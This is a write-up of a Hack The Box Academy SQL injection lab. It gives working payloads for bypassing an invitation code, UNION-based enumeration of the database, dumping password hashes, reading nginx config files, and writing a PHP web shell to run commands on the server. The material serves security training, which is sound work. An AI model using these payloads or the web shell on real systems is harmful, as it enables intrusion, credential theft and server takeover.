## Purpose:

This writeup detalis how to solve the Skills Assessment for the SQL Injection Fundamentals module from Hack THe Box Acadmey.


## Getting Started:
After starting the target, and pasting the ip in the browser youll notice that that the page doesnt load.

- You'll need to ignore the SSL Certificate to go to the page.


## Recon:

Lets find out some basic info about our target:

    whatweb https://154.57.164.68:30411

- This will reveal that the webserver is nginx/1.22.1


## Create Account:

Once you are at the webpage click on the "create account" tab navigate to register.php.

- The form will not let you create an account without an "invitation code".

  - However the name="invitationCode" param is vulnerable to an SQL injection.

    - You can bypass the invitationCode requirment with the payload: ' or ''='
   
    - The browser will not let you fillout the form, but using req.py or a proxy like Burp Suite, we can circumvent this restriction and send data to the server.
   
  - Notice that the registration form inclueds the following action param:
   
        <form action="/api/register.php" method="POST" id="registrationForm">

      We will need to send the request to: ip:port/api/register.php

You will have successfully created an account when you see this line in the Responce:

    Location: /login.php?s=account+created+successfully!

Explanation:

- The input is:

      invitationCode=' or ''='

- A likly query is:

      SELECT * FROM invites WHERE code = '$invitationCode

- Leading to:

      SELECT * FROM invites WHERE code = '' OR ''=''

- Note:

  - This exploit also allows us to create accounts with '' as the password, or with missmatched password inputs.


## Formatting An SQL Injection:

The "search in conversation" input field uses a GET request to retrieve data from the database. This represents a potential injection point.

Lets start by determine the number of columns we are working with

- We can do so with this injection:

      ') UNION SELECT 1,2,3,4-- -

<img width="1002" height="443" alt="chattr1" src="https://github.com/user-attachments/assets/0dd929e3-cb14-4704-afec-bba0cbdb12f1" />

- This allows us to break out of the original query with ')
- Then the UNION SELECT aligns the columns
- The result shows that columns "3" and "4" are displayed, and can be used to leak information


Lets try a basic exploit to find the database name with this injection:

    ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA-- -

<img width="1002" height="443" alt="chattr2" src="https://github.com/user-attachments/assets/51204977-5704-4349-a9f8-fba27763bda6" />

- This returns "chattr" and more inportantly we've found a way to use an SQL injection to leak info.


## Finding The Admin Password:

Now lets enumerate the databases and tables, we can do that with:

    ') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES-- -

- This returns a long list of information but lets focus on the following:
  - Table: Users
  - Database: chattr 

The next step is to get the column names for the "Users" table:

    ') UNION SELECT 1,2,COLUMN_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="Users"-- - 

<img width="1002" height="733" alt="columns" src="https://github.com/user-attachments/assets/d6bb39d0-c218-4927-ba16-e2d824eae498" />

Lets inspect the "Username" and "Password"

    ') UNION SELECT 1,2,Username,Password FROM chattr.Users-- -

<img width="1002" height="713" alt="passwd" src="https://github.com/user-attachments/assets/e21be696-f966-4daa-b651-76b94717b65a" />

- This gives us the password hashes!


## User Privileges:

Next, lets see what permissions are avalible with the payload:

    ') UNION SELECT 1,2,GRANTEE,PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES-- -

<img width="1002" height="443" alt="usrPriv" src="https://github.com/user-attachments/assets/ca9e85cc-0476-41e2-b3de-36021b756496" />

- This shows that user 'chattr_dbUser'@'localhost' has "FILE" permissions, meaning that we can read and write files.


## Reading Configuration File: 

  - In the Recon stage we saw that the webserver is "nginx".
  - Knowing this we can read the servers configuration file:

        ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -

<img width="1002" height="733" alt="conf" src="https://github.com/user-attachments/assets/0532f170-4912-4c03-a88e-64d1ce7e30fc" />

- There is a lot in the output, but lets focus on this:

<img width="1002" height="733" alt="confHostPath" src="https://github.com/user-attachments/assets/b5c2a112-a7d3-472e-a3dd-e64b1121b9e3" />

  - This about the virtual hosts.
      - A virtual host file’s job is to map a hostname to a directory on disk.
      - This directory is the webroot.
  
  - For Nginx servers, hosts live in "sites-enabled".
      - Therefore lets pay attention to: include /etc/nginx/sites-enabled/*;
      - The * is a placeholder, when Nginx is installed via apt the vhost file is named "default".
 
- Now we have what we need to read the host file:

        ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -

<img width="1002" height="562" alt="webroot" src="https://github.com/user-attachments/assets/95e067a2-2286-4a59-83f1-e5c9533e9dcb" />

- The webroot is: /var/www/chattr-prod


## Remote Code Execution:

Given that we have write permissions, let have a bit of fun and write some malicious code on the server.

    ') UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',"" into outfile "/var/www/chattr-prod/fSociety.php"-- -

- This will allow us to send commands through the url.

- For exampe lets list the files in the root directory (make sure to URL encode your command)

    - Command: ls /
 
          https://154.57.164.68:30411/fSociety.php?0=ls%20/

<img width="1002" height="353" alt="root" src="https://github.com/user-attachments/assets/4ccf4bf1-50c6-4d9f-83f6-18df2033e751" />

- The file "flag_876a4c.txt", looks interesting, lets read it.

        https://154.57.164.68:30411/fSociety.php?0=cat%20/flag_876a4c.txt

<img width="1002" height="353" alt="flag" src="https://github.com/user-attachments/assets/58b90b54-50a5-46a7-bb98-cbb453474118" />

- And with that, we've got the flag!
